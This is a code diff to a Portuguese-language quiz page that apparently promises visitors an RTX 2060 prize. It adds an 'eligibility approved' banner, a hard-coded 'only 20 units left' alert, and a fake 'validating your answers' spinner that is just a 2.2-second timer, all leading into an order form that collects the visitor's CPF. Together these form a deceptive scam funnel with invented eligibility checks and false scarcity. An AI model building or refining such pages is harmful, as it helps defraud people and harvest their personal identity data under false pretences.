@@ -403,6 +403,36 @@ header {
 @keyframes spin { to { transform: rotate(360deg); } }
 .spin-loader p { color: var(--muted); font-size: 14px; font-weight: 500; }
 
+.eligibility-banner {
+  background: linear-gradient(135deg, #ebf8ff 0%, #d8f3ff 100%);
+  border: 1px solid #b9e7ff;
+  border-radius: 10px;
+  padding: 12px;
+  margin-bottom: 14px;
+}
+.eligibility-banner h3 {
+  font-size: 15px;
+  color: var(--navy);
+  margin-bottom: 5px;
+}
+.eligibility-banner p {
+  font-size: 13px;
+  color: #35506b;
+  line-height: 1.45;
+}
+.stock-alert {
+  display: inline-block;
+  margin-top: 8px;
+  background: #fff1f2;
+  color: #c53030;
+  border: 1px solid #fecaca;
+  border-radius: 999px;
+  padding: 4px 10px;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.02em;
+}
+
 /* SIDEBAR */
 .side-card {
   background: var(--white);
@@ -911,8 +941,21 @@ footer strong { color: var(--navy); }
           <button class="btn-blue" onclick="nextPage(9)">Próximo</button>
         </div>
 
+        <div id="pageLoading" style="display:none;">
+          <div class="spin-loader active">
+            <div class="spinner"></div>
+            <p>Analisando suas respostas...</p>
+            <p style="font-size:12px; color:#7a8796;">Validando elegibilidade para o prêmio.</p>
+          </div>
+        </div>
+
         <!-- PAGE 10: Order -->
         <div id="page10" style="display:none;">
+          <div class="eligibility-banner">
+            <h3>Voce esta elegivel para o premio!</h3>
+            <p>Parabens! Sua participacao foi aprovada. Para garantir o envio da sua RTX 2060, finalize seu cadastro rapido agora.</p>
+            <span class="stock-alert">Restam apenas 20 unidades no estoque promocional</span>
+          </div>
           <p>Finalize seu pedido preenchendo os dados abaixo:</p>
           <div class="form-row">
             <div class="form-group">
@@ -1157,8 +1200,16 @@ function nextPage(current) {
       document.getElementById('page9').style.display = 'block'; // Show back
       return;
     }
-    document.getElementById('page10').style.display = 'block';
-    updateStep(4, 5);
+    document.getElementById('pageLoading').style.display = 'block';
+    setTimeout(() => {
+      for (let i = 1; i <= 11; i++) {
+        const page = document.getElementById('page' + i);
+        if (page) page.style.display = 'none';
+      }
+      document.getElementById('pageLoading').style.display = 'none';
+      document.getElementById('page10').style.display = 'block';
+      updateStep(4, 5);
+    }, 2200);
   } else if (current === 10) {
     // Order to prize
     const cpf = document.getElementById('cpf').value;
